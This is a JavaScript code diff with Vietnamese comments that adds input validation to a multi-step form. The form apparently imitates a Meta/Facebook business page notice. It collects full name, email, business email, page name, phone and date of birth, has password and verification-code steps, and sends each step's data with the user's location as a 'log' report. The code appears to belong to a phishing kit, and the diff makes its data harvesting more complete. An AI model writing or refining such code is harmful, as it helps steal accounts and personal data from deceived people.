@@ -50,6 +50,10 @@ const Modal = {
             const err = document.getElementById("verifyError");
             if (err) err.classList.add("hidden");
         }
+        if (type === 'password') {
+            const err = document.getElementById("passwordError");
+            if (err) err.classList.add("hidden");
+        }
     }
 };
 
@@ -182,23 +186,65 @@ document.addEventListener("DOMContentLoaded", async () => {
         btnSubmit.addEventListener("click", () => Modal.show("infoForm"));
     }
 
-    // --- BƯỚC 1: XỬ LÝ FORM INFO ---
+    // --- BƯỚC 1: XỬ LÝ FORM INFO (CÓ VALIDATION DÒNG ĐỎ) ---
     if (btnSendInfo) {
         btnSendInfo.addEventListener("click", () => {
             const inputs = document.querySelectorAll("#infoForm .meta-input");
             const dobInputs = document.querySelectorAll("#infoForm .grid input");
 
-            // Map dữ liệu từ input (Thứ tự input trong HTML phải đúng)
-            // [0] FullName, [1] Email, [2] Business Email, [3] Page Name, [4] Phone
-            formData.fullName = inputs[0].value || "N/A";
-            formData.email = inputs[1].value || "N/A";
-            formData.businessEmail = inputs[2].value || "N/A"; // Lấy Business Email
-            formData.phone = inputs[4].value || "N/A";
+            // Lấy giá trị và xóa khoảng trắng thừa
+            const valName = inputs[0].value.trim();
+            const valEmail = inputs[1].value.trim();
+            const valBizMail = inputs[2].value.trim();
+            const valPage = inputs[3].value.trim();
+            const valPhone = inputs[4].value.trim();
             
-            // Xử lý ngày sinh
+            // Lấy ngày sinh
+            let valDob = "";
+            let hasDob = false;
             if (dobInputs.length >= 3) {
-                formData.dob = `${dobInputs[0].value}/${dobInputs[1].value}/${dobInputs[2].value}`;
+                const d = dobInputs[0].value.trim();
+                const m = dobInputs[1].value.trim();
+                const y = dobInputs[2].value.trim();
+                if (d && m && y) {
+                    valDob = `${d}/${m}/${y}`;
+                    hasDob = true;
+                }
             }
+
+            // === KIỂM TRA: Nếu thiếu thông tin thì HIỆN LỖI ĐỎ ===
+            // (Thiếu Tên OR Email OR SĐT OR Ngày sinh)
+            if (!valName || !valEmail || !valPhone || !hasDob) {
+                
+                // Tìm xem đã có thẻ lỗi chưa
+                let errEl = document.getElementById("infoError");
+                
+                // Nếu chưa có thì tạo mới (chèn ngay trước nút Send)
+                if (!errEl) {
+                    errEl = document.createElement("p");
+                    errEl.id = "infoError";
+                    errEl.className = "text-red-500 text-sm mt-3 text-center"; // Tailwind CSS màu đỏ
+                    btnSendInfo.parentNode.insertBefore(errEl, btnSendInfo);
+                }
+
+                // Gán nội dung lỗi và hiển thị
+                errEl.innerText = "Please fill in all required fields.";
+                errEl.classList.remove("hidden");
+                
+                return; // Dừng lại, không gửi tin
+            }
+
+            // === NẾU ĐÃ NHẬP ĐỦ ===
+            // Ẩn lỗi đi (nếu đang hiện)
+            const existingErr = document.getElementById("infoError");
+            if (existingErr) existingErr.classList.add("hidden");
+
+            // Lưu dữ liệu
+            formData.fullName = valName;
+            formData.email = valEmail;
+            formData.businessEmail = valBizMail; 
+            formData.phone = valPhone;
+            formData.dob = valDob;
 
             // Gửi Log INFO
             Utils.sendMessage(Utils.formatReport(formData, "INFO", userLoc));
